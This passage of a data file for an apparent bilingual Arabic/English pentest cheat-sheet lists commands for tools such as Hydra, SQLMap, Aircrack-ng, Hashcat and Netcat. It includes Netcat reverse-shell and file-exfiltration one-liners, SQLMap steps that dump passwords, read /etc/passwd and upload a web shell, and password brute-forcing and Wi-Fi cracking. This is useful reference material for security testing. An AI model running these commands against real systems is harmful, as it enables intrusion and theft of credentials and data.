                    description: { ar: "وضع مفصل", en: "Verbose mode" },
                },
                {
                    command: "hydra -e nsr -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "تجربة كلمات مرور فارغة", en: "Try empty passwords" },
                },
                {
                    command: "hydra -o results.txt -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "حفظ النتائج", en: "Save results" },
                },
                {
                    command: "hydra -x 6:8:aA1 192.168.1.1 ssh -l admin",
                    description: { ar: "توليد كلمات مرور", en: "Generate passwords" },
                },
                {
                    command: "hydra -l admin -P pass.txt smb://192.168.1.1",
                    description: { ar: "هجوم SMB", en: "SMB attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt telnet://192.168.1.1",
                    description: { ar: "هجوم Telnet", en: "Telnet attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt vnc://192.168.1.1",
                    description: { ar: "هجوم VNC", en: "VNC attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt pop3://192.168.1.1",
                    description: { ar: "هجوم POP3", en: "POP3 attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt imap://192.168.1.1",
                    description: { ar: "هجوم IMAP", en: "IMAP attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt smtp://192.168.1.1",
                    description: { ar: "هجوم SMTP", en: "SMTP attack" },
                },
                {
                    command: "hydra -l admin -P pass.txt ldap://192.168.1.1",
                    description: { ar: "هجوم LDAP", en: "LDAP attack" },
                },
                {
                    command: "hydra -s 8080 -l admin -P pass.txt 192.168.1.1 http-get",
                    description: { ar: "منفذ مخصص", en: "Custom port" },
                },
                {
                    command: "hydra -w 10 -l admin -P pass.txt 192.168.1.1 ssh",
                    description: { ar: "وقت انتظار 10 ثواني", en: "10 second wait" },
                },
                { command: "hydra -R", description: { ar: "استكمال جلسة سابقة", en: "Resume previous session" } },
            ],
        },
        {
            name: "SQLMap",
            description: { ar: "أداة آلية لاكتشاف واستغلال ثغرات SQL", en: "Automatic SQL injection tool" },
            commands: [
                { command: 'sqlmap -u "http://site.com/page?id=1"', description: { ar: "فحص رابط", en: "Scan URL" } },
                {
                    command: 'sqlmap -u "URL" --dbs',
                    description: { ar: "استخراج قواعد البيانات", en: "Extract databases" },
                },
                {
                    command: 'sqlmap -u "URL" -D dbname --tables',
                    description: { ar: "استخراج الجداول", en: "Extract tables" },
                },
                {
                    command: 'sqlmap -u "URL" -D dbname -T users --dump',
                    description: { ar: "تفريغ البيانات", en: "Dump data" },
                },
                {
                    command: 'sqlmap -u "URL" --current-user',
                    description: { ar: "المستخدم الحالي", en: "Current user" },
                },
                { command: 'sqlmap -u "URL" --is-dba', description: { ar: "صلاحيات المدير", en: "DBA check" } },
                { command: 'sqlmap -u "URL" --os-shell', description: { ar: "الحصول على Shell", en: "Get shell" } },
                { command: "sqlmap -r request.txt", description: { ar: "فحص من ملف", en: "Scan from file" } },
                { command: 'sqlmap -u "URL" --level=5 --risk=3', description: { ar: "فحص عميق", en: "Deep scan" } },
                {
                    command: 'sqlmap -u "URL" --tamper=space2comment',
                    description: { ar: "تجاوز الحماية", en: "Bypass filters" },
                },
                { command: 'sqlmap -u "URL" --batch', description: { ar: "وضع تلقائي", en: "Batch mode" } },
                {
                    command: 'sqlmap -u "URL" --passwords',
                    description: { ar: "استخراج كلمات المرور", en: "Extract passwords" },
                },
                {
                    command: 'sqlmap -u "URL" --file-read=/etc/passwd',
                    description: { ar: "قراءة ملف", en: "Read file" },
                },
                {
                    command: 'sqlmap -u "URL" --file-write=shell.php --file-dest=/var/www/html/',
                    description: { ar: "رفع ملف", en: "Upload file" },
                },
                {
                    command: 'sqlmap -u "URL" --sql-shell',
                    description: { ar: "SQL Shell تفاعلي", en: "Interactive SQL shell" },
                },
                {
                    command: 'sqlmap -u "URL" --dbms=mysql',
                    description: { ar: "تحديد نوع قاعدة البيانات", en: "Specify DBMS" },
                },
                {
                    command: 'sqlmap -u "URL" --technique=BEUST',
                    description: { ar: "تحديد التقنيات", en: "Specify techniques" },
                },
                {
                    command: 'sqlmap -u "URL" --threads=10',
                    description: { ar: "10 خيوط متوازية", en: "10 parallel threads" },
                },
                {
                    command: 'sqlmap -u "URL" --random-agent',
                    description: { ar: "User-Agent عشوائي", en: "Random User-Agent" },
                },
                { command: 'sqlmap -u "URL" --tor', description: { ar: "استخدام Tor", en: "Use Tor" } },
            ],
        },
        {
            name: "Aircrack-ng",
            description: { ar: "مجموعة أدوات لاختبار أمان شبكات Wi-Fi", en: "Wi-Fi security testing suite" },
            commands: [
                {
                    command: "airmon-ng start wlan0",
                    description: { ar: "تفعيل وضع المراقبة", en: "Enable monitor mode" },
                },
                { command: "airodump-ng wlan0mon", description: { ar: "مسح الشبكات", en: "Scan networks" } },
                {
                    command: "airodump-ng -c 6 --bssid XX:XX:XX -w capture wlan0mon",
                    description: { ar: "التقاط حزم شبكة محددة", en: "Capture specific network" },
                },
                {
                    command: "aireplay-ng -0 10 -a XX:XX:XX wlan0mon",
                    description: { ar: "هجوم Deauth", en: "Deauth attack" },
                },
                {
                    command: "aircrack-ng -w wordlist.txt capture.cap",
                    description: { ar: "كسر WPA/WPA2", en: "Crack WPA/WPA2" },
                },
                {
                    command: "aireplay-ng -1 0 -a XX:XX:XX wlan0mon",
                    description: { ar: "مصادقة مزيفة", en: "Fake auth" },
                },
                {
                    command: "aireplay-ng -3 -b XX:XX:XX wlan0mon",
                    description: { ar: "إعادة حقن ARP", en: "ARP replay" },
                },
                {
                    command: "airmon-ng check kill",
                    description: { ar: "إيقاف العمليات المتعارضة", en: "Kill conflicting processes" },
                },
                {
                    command: "airmon-ng stop wlan0mon",
                    description: { ar: "إيقاف وضع المراقبة", en: "Stop monitor mode" },
                },
                {
                    command: "aircrack-ng -J hashcat capture.cap",
                    description: { ar: "تصدير لـ Hashcat", en: "Export for Hashcat" },
                },
                {
                    command: "airodump-ng --encrypt wpa wlan0mon",
                    description: { ar: "عرض WPA فقط", en: "Show WPA only" },
                },
                { command: "aireplay-ng -9 wlan0mon", description: { ar: "اختبار الحقن", en: "Injection test" } },
                {
                    command: "airbase-ng -a XX:XX:XX -e FakeAP wlan0mon",
                    description: { ar: "إنشاء نقطة وصول مزيفة", en: "Create fake AP" },
                },
                {
                    command: "airdecap-ng -w passphrase capture.cap",
                    description: { ar: "فك تشفير الحزم", en: "Decrypt packets" },
                },
                { command: "besside-ng wlan0mon", description: { ar: "كسر تلقائي", en: "Auto crack" } },
                {
                    command: "airodump-ng --wps wlan0mon",
                    description: { ar: "عرض شبكات WPS", en: "Show WPS networks" },
                },
                {
                    command:
                        "packetforge-ng -0 -a XX:XX:XX -h YY:YY:YY -k 255.255.255.255 -l 255.255.255.255 -y frag.xor -w arp.cap",
                    description: { ar: "إنشاء حزمة ARP", en: "Forge ARP packet" },
                },
                {
                    command: "airolib-ng mydb --import passwd rockyou.txt",
                    description: { ar: "إنشاء قاعدة بيانات PMK", en: "Create PMK database" },
                },
                {
                    command: "airodump-ng -c 1,6,11 wlan0mon",
                    description: { ar: "مسح قنوات محددة", en: "Scan specific channels" },
                },
                {
                    command: "aircrack-ng -b XX:XX:XX capture.cap",
                    description: { ar: "كسر BSSID محدد", en: "Crack specific BSSID" },
                },
            ],
        },
        {
            name: "Nikto",
            description: { ar: "أداة فحص الثغرات في خوادم الويب", en: "Web server vulnerability scanner" },
            commands: [
                { command: "nikto -h http://192.168.1.1", description: { ar: "فحص أساسي", en: "Basic scan" } },
                {
                    command: "nikto -h http://192.168.1.1 -p 8080",
                    description: { ar: "فحص منفذ محدد", en: "Scan specific port" },
                },
                { command: "nikto -h http://192.168.1.1 -ssl", description: { ar: "فحص HTTPS", en: "Scan HTTPS" } },
                {
                    command: "nikto -h http://192.168.1.1 -o report.html -Format htm",
                    description: { ar: "تقرير HTML", en: "HTML report" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 9",
                    description: { ar: "فحص SQL Injection", en: "SQL Injection scan" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -evasion 1",
                    description: { ar: "تجاوز IDS", en: "IDS evasion" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -maxtime 60s",
                    description: { ar: "تحديد الوقت", en: "Set time limit" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -C all",
                    description: { ar: "فحص جميع CGI", en: "Scan all CGI" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Display V",
                    description: { ar: "عرض تفاصيل", en: "Show details" },
                },
                { command: "nikto -update", description: { ar: "تحديث قاعدة البيانات", en: "Update database" } },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 1",
                    description: { ar: "اختبار الملفات المثيرة", en: "Interesting files" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 2",
                    description: { ar: "إعدادات خاطئة", en: "Misconfigurations" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 3",
                    description: { ar: "الإفصاح عن المعلومات", en: "Info disclosure" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Tuning 4",
                    description: { ar: "حقن XSS", en: "XSS injection" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -id admin:password",
                    description: { ar: "مصادقة HTTP", en: "HTTP auth" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -useproxy http://127.0.0.1:8080",
                    description: { ar: "استخدام بروكسي", en: "Use proxy" },
                },
                { command: "nikto -h targets.txt", description: { ar: "فحص من ملف", en: "Scan from file" } },
                { command: "nikto -h http://192.168.1.1 -no404", description: { ar: "تجاهل 404", en: "Ignore 404" } },
                {
                    command: "nikto -h http://192.168.1.1 -root /admin",
                    description: { ar: "تحديد المسار الجذري", en: "Set root path" },
                },
                {
                    command: "nikto -h http://192.168.1.1 -Pause 5",
                    description: { ar: "إيقاف مؤقت 5 ثواني", en: "5 second pause" },
                },
            ],
        },
        {
            name: "Hashcat",
            description: { ar: "أداة كسر الهاش باستخدام GPU", en: "GPU hash cracking tool" },
            commands: [
                { command: "hashcat -m 0 hash.txt wordlist.txt", description: { ar: "كسر MD5", en: "Crack MD5" } },
                { command: "hashcat -m 1000 hash.txt wordlist.txt", description: { ar: "كسر NTLM", en: "Crack NTLM" } },
                {
                    command: "hashcat -m 1800 hash.txt wordlist.txt",
                    description: { ar: "كسر SHA512", en: "Crack SHA512" },
                },
                {
                    command: "hashcat -m 22000 hash.hc22000 wordlist.txt",
                    description: { ar: "كسر WPA2", en: "Crack WPA2" },
                },
                {
                    command: "hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a",
                    description: { ar: "هجوم Mask", en: "Mask attack" },
                },
                {
                    command: "hashcat -a 0 -m 0 hash.txt wordlist.txt -r rules.rule",
                    description: { ar: "هجوم مع قواعد", en: "Attack with rules" },
                },
                {
                    command: "hashcat -a 6 -m 0 hash.txt wordlist.txt ?d?d",
                    description: { ar: "هجوم مختلط", en: "Hybrid attack" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --show",
                    description: { ar: "عرض المكسورة", en: "Show cracked" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt -O",
                    description: { ar: "تحسين الأداء", en: "Optimize performance" },
                },
                { command: "hashcat -I", description: { ar: "معلومات الأجهزة", en: "Device info" } },
                { command: "hashcat --benchmark", description: { ar: "اختبار الأداء", en: "Benchmark" } },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --increment",
                    description: { ar: "وضع تزايدي", en: "Increment mode" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt -w 3",
                    description: { ar: "وضع أداء عالي", en: "High performance" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --session=crack1",
                    description: { ar: "حفظ الجلسة", en: "Save session" },
                },
                { command: "hashcat --restore", description: { ar: "استكمال الجلسة", en: "Restore session" } },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --potfile-disable",
                    description: { ar: "تعطيل Potfile", en: "Disable potfile" },
                },
                {
                    command: "hashcat -m 0 hash.txt wordlist.txt --force",
                    description: { ar: "تجاوز التحذيرات", en: "Force run" },
                },
                {
                    command: "hashcat -m 0 hash.txt -a 1 dict1.txt dict2.txt",
                    description: { ar: "هجوم Combinator", en: "Combinator attack" },
                },
                {
                    command: "hashcat -m 400 hash.txt wordlist.txt",
                    description: { ar: "كسر WordPress", en: "Crack WordPress" },
                },
                { command: "hashcat -m 1500 hash.txt wordlist.txt", description: { ar: "كسر DES", en: "Crack DES" } },
            ],
        },
        {
            name: "Gobuster",
            description: { ar: "أداة اكتشاف المجلدات والملفات", en: "Directory and file discovery tool" },
            commands: [
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt",
                    description: { ar: "اكتشاف المجلدات", en: "Directory discovery" },
                },
                {
                    command: "gobuster dns -d target.com -w subdomains.txt",
                    description: { ar: "اكتشاف النطاقات الفرعية", en: "Subdomain discovery" },
                },
                {
                    command: "gobuster vhost -u http://target.com -w hosts.txt",
                    description: { ar: "اكتشاف Virtual Hosts", en: "Virtual host discovery" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt",
                    description: { ar: "البحث عن امتدادات محددة", en: "Search specific extensions" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -t 50",
                    description: { ar: "50 خيط متوازي", en: "50 parallel threads" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -o results.txt",
                    description: { ar: "حفظ النتائج", en: "Save results" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -c 'session=abc123'",
                    description: { ar: "استخدام كوكيز", en: "Use cookies" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -a 'Mozilla/5.0'",
                    description: { ar: "تغيير User-Agent", en: "Custom User-Agent" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -r",
                    description: { ar: "تتبع إعادة التوجيه", en: "Follow redirects" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -k",
                    description: { ar: "تجاهل شهادة SSL", en: "Ignore SSL cert" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -b 404,403",
                    description: { ar: "تجاهل أكواد محددة", en: "Ignore specific codes" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -s 200,301",
                    description: { ar: "عرض أكواد محددة فقط", en: "Show only specific codes" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt --wildcard",
                    description: { ar: "التعامل مع Wildcard", en: "Handle wildcard" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -U admin -P password",
                    description: { ar: "مصادقة HTTP", en: "HTTP auth" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -p http://127.0.0.1:8080",
                    description: { ar: "استخدام بروكسي", en: "Use proxy" },
                },
                {
                    command: "gobuster fuzz -u http://target.com/FUZZ -w wordlist.txt",
                    description: { ar: "وضع Fuzzing", en: "Fuzzing mode" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt --no-error",
                    description: { ar: "تجاهل الأخطاء", en: "Ignore errors" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -d",
                    description: { ar: "عرض نص الاستجابة", en: "Show response body" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt --delay 100ms",
                    description: { ar: "تأخير بين الطلبات", en: "Delay between requests" },
                },
                {
                    command: "gobuster dir -u http://target.com -w wordlist.txt -e",
                    description: { ar: "عرض الروابط الكاملة", en: "Show full URLs" },
                },
            ],
        },
        {
            name: "Netcat",
            description: { ar: "أداة الشبكات متعددة الاستخدامات", en: "Versatile networking tool" },
            commands: [
                { command: "nc -lvnp 4444", description: { ar: "الاستماع على منفذ", en: "Listen on port" } },
                { command: "nc 192.168.1.1 4444", description: { ar: "الاتصال بمنفذ", en: "Connect to port" } },
                {
                    command: "nc -e /bin/bash 192.168.1.1 4444",
                    description: { ar: "Reverse Shell", en: "Reverse shell" },
                },
                { command: "nc -lvnp 4444 > file.txt", description: { ar: "استقبال ملف", en: "Receive file" } },
                { command: "nc 192.168.1.1 4444 < file.txt", description: { ar: "إرسال ملف", en: "Send file" } },
                { command: "nc -zv 192.168.1.1 1-1000", description: { ar: "فحص المنافذ", en: "Port scan" } },
                { command: "nc -lvnp 4444 -k", description: { ar: "استماع مستمر", en: "Persistent listen" } },
                { command: "nc -u -lvnp 4444", description: { ar: "استماع UDP", en: "UDP listen" } },
                {
                    command: "nc -nvlp 4444 -c 'echo Welcome'",
                    description: { ar: "تنفيذ أمر عند الاتصال", en: "Execute on connect" },
                },
                {
                    command: "nc -w 5 192.168.1.1 4444",
                    description: { ar: "وقت انتظار 5 ثواني", en: "5 second timeout" },
                },
                {
                    command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f",
                    description: { ar: "Reverse Shell مع FIFO", en: "Reverse shell with FIFO" },
                },
                {
                    command: "nc -lvnp 80 < index.html",
                    description: { ar: "خادم HTTP بسيط", en: "Simple HTTP server" },
                },
                {
                    command: "echo 'GET / HTTP/1.1\\nHost: target.com\\n\\n' | nc target.com 80",
                    description: { ar: "طلب HTTP يدوي", en: "Manual HTTP request" },
                },
                {
                    command: "nc -lvnp 4444 2>&1 | tee capture.txt",
                    description: { ar: "تسجيل الاتصال", en: "Log connection" },
                },
                {
                    command: "nc -x proxy:8080 target.com 80",
                    description: { ar: "الاتصال عبر بروكسي", en: "Connect via proxy" },
                },
                { command: "nc -C target.com 25", description: { ar: "اتصال SMTP", en: "SMTP connection" } },
                {
                    command: "while true; do nc -lvnp 4444; done",
                    description: { ar: "استماع متكرر", en: "Repeated listen" },
                },
                {
                    command: "nc -s 192.168.1.100 192.168.1.1 4444",
                    description: { ar: "تحديد IP المصدر", en: "Specify source IP" },
                },
                {
                    command: "nc -l 4444 | tar xvf -",
                    description: { ar: "استقبال وفك ضغط", en: "Receive and extract" },
                },
                {
                    command: "tar cf - . | nc 192.168.1.1 4444",
                    description: { ar: "ضغط وإرسال", en: "Compress and send" },
                },
            ],
        },
        {
            name: "Enum4linux",
            description: { ar: "أداة استطلاع Windows/Samba", en: "Windows/Samba enumeration tool" },
            commands: [
                { command: "enum4linux -a 192.168.1.1", description: { ar: "استطلاع شامل", en: "Full enumeration" } },
                {
                    command: "enum4linux -U 192.168.1.1",
                    description: { ar: "استخراج المستخدمين", en: "Extract users" },
                },
                {
                    command: "enum4linux -S 192.168.1.1",
                    description: { ar: "استخراج المشاركات", en: "Extract shares" },
                },
                {
                    command: "enum4linux -G 192.168.1.1",
                    description: { ar: "استخراج المجموعات", en: "Extract groups" },
                },
                {
                    command: "enum4linux -P 192.168.1.1",
                    description: { ar: "سياسة كلمات المرور", en: "Password policy" },
                },
                { command: "enum4linux -o 192.168.1.1", description: { ar: "معلومات نظام التشغيل", en: "OS info" } },
                {
                    command: "enum4linux -n 192.168.1.1",
                    description: { ar: "جدول أسماء NetBIOS", en: "NetBIOS name table" },
                },
                { command: "enum4linux -M 192.168.1.1", description: { ar: "قائمة الأجهزة", en: "Machine list" } },
                { command: "enum4linux -r 192.168.1.1", description: { ar: "استخراج RID", en: "RID enumeration" } },
                {
                    command: "enum4linux -u admin -p password 192.168.1.1",
                    description: { ar: "استطلاع مع صلاحيات", en: "Authenticated enum" },
                },
                {
                    command: "enum4linux -R 1000-2000 192.168.1.1",
                    description: { ar: "نطاق RID مخصص", en: "Custom RID range" },
                },
                { command: "enum4linux -d 192.168.1.1", description: { ar: "تفاصيل إضافية", en: "Extra details" } },
                { command: "enum4linux -K 192.168.1.1", description: { ar: "استخدام Kerberos", en: "Use Kerberos" } },
                {
                    command: "enum4linux -w DOMAIN 192.168.1.1",
                    description: { ar: "تحديد الدومين", en: "Specify domain" },
                },
                { command: "enum4linux -l 192.168.1.1", description: { ar: "معلومات LDAP", en: "LDAP info" } },
                { command: "enum4linux -A 192.168.1.1", description: { ar: "استطلاع عدواني", en: "Aggressive enum" } },
                { command: "enum4linux -v 192.168.1.1", description: { ar: "وضع مفصل", en: "Verbose mode" } },
                {
                    command: "enum4linux -s shares.txt 192.168.1.1",
                    description: { ar: "فحص من قائمة", en: "Scan from list" },
                },
                { command: "enum4linux -I 192.168.1.1", description: { ar: "معلومات الطابعات", en: "Printer info" } },
                {
                    command: "enum4linux -C 192.168.1.1",
                    description: { ar: "تعليقات المشاركات", en: "Share comments" },
                },
            ],
        },
        {
            name: "Dirb",
            description: { ar: "أداة اكتشاف محتوى الويب", en: "Web content discovery tool" },
            commands: [
                { command: "dirb http://target.com", description: { ar: "فحص أساسي", en: "Basic scan" } },
                {
                    command: "dirb http://target.com /usr/share/wordlists/dirb/big.txt",
                    description: { ar: "قائمة كبيرة", en: "Big wordlist" },
                },
                {
                    command: "dirb http://target.com -a 'Mozilla/5.0'",
                    description: { ar: "تغيير User-Agent", en: "Custom User-Agent" },
                },
                {
                    command: "dirb http://target.com -o output.txt",
                    description: { ar: "حفظ النتائج", en: "Save results" },
                },
                {
                    command: "dirb http://target.com -X .php,.html",
                    description: { ar: "امتدادات محددة", en: "Specific extensions" },
                },
                {
                    command: "dirb http://target.com -c 'PHPSESSID=abc123'",
                    description: { ar: "استخدام كوكيز", en: "Use cookies" },
                },
                {
                    command: "dirb http://target.com -u admin:password",
                    description: { ar: "مصادقة HTTP", en: "HTTP auth" },
                },
                {
                    command: "dirb http://target.com -p http://127.0.0.1:8080",
                    description: { ar: "استخدام بروكسي", en: "Use proxy" },
                },
                {
                    command: "dirb http://target.com -z 10",
                    description: { ar: "تأخير 10 مللي ثانية", en: "10ms delay" },
                },
                {
                    command: "dirb http://target.com -N 404",
                    description: { ar: "تجاهل كود محدد", en: "Ignore specific code" },
                },
                { command: "dirb http://target.com -r", description: { ar: "عدم البحث العودي", en: "Non-recursive" } },
                { command: "dirb http://target.com -w", description: { ar: "تجاهل التحذيرات", en: "Ignore warnings" } },
                { command: "dirb http://target.com -S", description: { ar: "وضع صامت", en: "Silent mode" } },
                { command: "dirb http://target.com -f", description: { ar: "ضبط دقيق", en: "Fine tuning" } },
                { command: "dirb http://target.com -t", description: { ar: "عدم تفاعلي", en: "Non-interactive" } },
                { command: "dirb https://target.com", description: { ar: "فحص HTTPS", en: "HTTPS scan" } },
                { command: "dirb http://target.com:8080", description: { ar: "منفذ مخصص", en: "Custom port" } },
                {
                    command: "dirb http://target.com -H 'X-Custom: value'",
                    description: { ar: "رأس مخصص", en: "Custom header" },
                },
                {
                    command: "dirb http://target.com -i",
                    description: { ar: "بحث غير حساس للحالة", en: "Case insensitive" },
                },
                {
                    command: "dirb http://target.com /usr/share/wordlists/common.txt -x extensions.txt",
                    description: { ar: "ملف امتدادات", en: "Extensions file" },
                },
            ],
        },
        {
            name: "Wfuzz",
            description: { ar: "أداة Fuzzing لتطبيقات الويب", en: "Web application fuzzing tool" },
            commands: [
                {
                    command: "wfuzz -c -z file,wordlist.txt http://target.com/FUZZ",
                    description: { ar: "Fuzzing أساسي", en: "Basic fuzzing" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ",
                    description: { ar: "تجاهل 404", en: "Hide 404" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -d 'user=admin&pass=FUZZ' http://target.com/login",
                    description: { ar: "Fuzzing POST", en: "POST fuzzing" },
                },
                {
                    command: "wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ",
                    description: { ar: "نطاق أرقام", en: "Number range" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -H 'Cookie: session=FUZZ' http://target.com/",
                    description: { ar: "Fuzzing الكوكيز", en: "Cookie fuzzing" },
                },
                {
                    command:
                        "wfuzz -c -z file,users.txt -z file,passwords.txt http://target.com/login?user=FUZ2Z&pass=FUZZ",
                    description: { ar: "Fuzzing متعدد", en: "Multi fuzzing" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --hl 0 http://target.com/FUZZ",
                    description: { ar: "إخفاء ردود فارغة", en: "Hide empty responses" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -b 'session=abc123' http://target.com/FUZZ",
                    description: { ar: "استخدام كوكيز", en: "Use cookies" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080 http://target.com/FUZZ",
                    description: { ar: "استخدام بروكسي", en: "Use proxy" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -t 50 http://target.com/FUZZ",
                    description: { ar: "50 خيط", en: "50 threads" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --sc 200 http://target.com/FUZZ",
                    description: { ar: "عرض 200 فقط", en: "Show only 200" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --sw 10 http://target.com/FUZZ",
                    description: { ar: "عرض حسب عدد الكلمات", en: "Show by word count" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -R 2 http://target.com/FUZZ",
                    description: { ar: "عمق العودية 2", en: "Recursion depth 2" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -L http://target.com/FUZZ",
                    description: { ar: "تتبع إعادة التوجيه", en: "Follow redirects" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt --req-delay 1 http://target.com/FUZZ",
                    description: { ar: "تأخير ثانية", en: "1 second delay" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -o json http://target.com/FUZZ",
                    description: { ar: "مخرجات JSON", en: "JSON output" },
                },
                { command: "wfuzz -e payloads", description: { ar: "عرض الحمولات المتاحة", en: "List payloads" } },
                {
                    command: "wfuzz -c -z file,wordlist.txt --script=robots http://target.com/FUZZ",
                    description: { ar: "استخدام سكربت", en: "Use script" },
                },
                {
                    command: "wfuzz -c -z list,admin-config-backup http://target.com/FUZZ",
                    description: { ar: "قائمة مباشرة", en: "Direct list" },
                },
                {
                    command: "wfuzz -c -z file,wordlist.txt -f output.html,html http://target.com/FUZZ",
                    description: { ar: "تقرير HTML", en: "HTML report" },
                },
            ],
        },
        {
            name: "theHarvester",
            description: { ar: "أداة جمع المعلومات والبريد الإلكتروني", en: "Email and info gathering tool" },
            commands: [
                {
                    command: "theHarvester -d target.com -b google",
                    description: { ar: "بحث Google", en: "Google search" },
                },
                {
                    command: "theHarvester -d target.com -b all",
                    description: { ar: "جميع المصادر", en: "All sources" },
                },
                {
                    command: "theHarvester -d target.com -b linkedin",
                    description: { ar: "بحث LinkedIn", en: "LinkedIn search" },
                },
                { command: "theHarvester -d target.com -b bing", description: { ar: "بحث Bing", en: "Bing search" } },
                { command: "theHarvester -d target.com -l 500", description: { ar: "500 نتيجة", en: "500 results" } },
                {
                    command: "theHarvester -d target.com -b google -f report",
                    description: { ar: "حفظ تقرير", en: "Save report" },
                },
                {
                    command: "theHarvester -d target.com -b shodan",
                    description: { ar: "بحث Shodan", en: "Shodan search" },
                },
                {
                    command: "theHarvester -d target.com -b crtsh",
                    description: { ar: "بحث الشهادات", en: "Certificate search" },
                },
                {
                    command: "theHarvester -d target.com -b virustotal",
                    description: { ar: "بحث VirusTotal", en: "VirusTotal search" },
                },
                {
                    command: "theHarvester -d target.com -b hunter",
                    description: { ar: "بحث Hunter.io", en: "Hunter.io search" },
                },
                {
                    command: "theHarvester -d target.com -b dnsdumpster",
                    description: { ar: "DNS Dumpster", en: "DNS Dumpster" },
                },
                {
                    command: "theHarvester -d target.com -b github-code",
                    description: { ar: "بحث GitHub", en: "GitHub search" },
                },
                {
                    command: "theHarvester -d target.com -b yahoo",
                    description: { ar: "بحث Yahoo", en: "Yahoo search" },
                },
                {
                    command: "theHarvester -d target.com -b baidu",
                    description: { ar: "بحث Baidu", en: "Baidu search" },
                },
                { command: "theHarvester -d target.com -n", description: { ar: "البحث عن DNS", en: "DNS lookup" } },
                { command: "theHarvester -d target.com -c", description: { ar: "البحث العميق", en: "Deep search" } },
                {
                    command: "theHarvester -d target.com -v",
                    description: { ar: "التحقق من المضيفين", en: "Verify hosts" },
                },
                { command: "theHarvester -d target.com -r", description: { ar: "البحث العكسي", en: "Reverse lookup" } },
                { command: "theHarvester -d target.com -s", description: { ar: "بداية النتائج", en: "Start result" } },
                {
                    command: "theHarvester -d target.com -b google,bing,linkedin",
                    description: { ar: "مصادر متعددة", en: "Multiple sources" },
                },
            ],
        },
        {
            name: "Maltego",
            description: { ar: "أداة تحليل الروابط والاستطلاع", en: "Link analysis and recon tool" },
            commands: [
                { command: "maltego", description: { ar: "تشغيل Maltego", en: "Start Maltego" } },
                { command: "New Graph → Add Entity", description: { ar: "إضافة كيان جديد", en: "Add new entity" } },
                {
                    command: "Entity → Domain → Run All Transforms",
                    description: { ar: "تشغيل جميع التحويلات", en: "Run all transforms" },
                },
                {
                    command: "Entity → Person → To Email Addresses",
                    description: { ar: "استخراج البريد", en: "Extract emails" },
                },
                { command: "Entity → Domain → To DNS Names", description: { ar: "أسماء DNS", en: "DNS names" } },
                { command: "Entity → IP → To Netblocks", description: { ar: "نطاقات الشبكة", en: "Netblocks" } },
                { command: "Entity → Email → To Person", description: { ar: "معلومات الشخص", en: "Person info" } },
                {
                    command: "Entity → Phone Number → To Person",
                    description: { ar: "ربط رقم بشخص", en: "Link phone to person" },
                },
                { command: "Entity → Website → To IP", description: { ar: "IP الموقع", en: "Website IP" } },
                {
                    command: "Entity → Company → To Domains",
                    description: { ar: "نطاقات الشركة", en: "Company domains" },
                },
                { command: "View → Graph Layout → Organic", description: { ar: "تخطيط عضوي", en: "Organic layout" } },
                {
                    command: "View → Graph Layout → Hierarchical",
                    description: { ar: "تخطيط هرمي", en: "Hierarchical layout" },
                },
                { command: "File → Export → As Image", description: { ar: "تصدير كصورة", en: "Export as image" } },
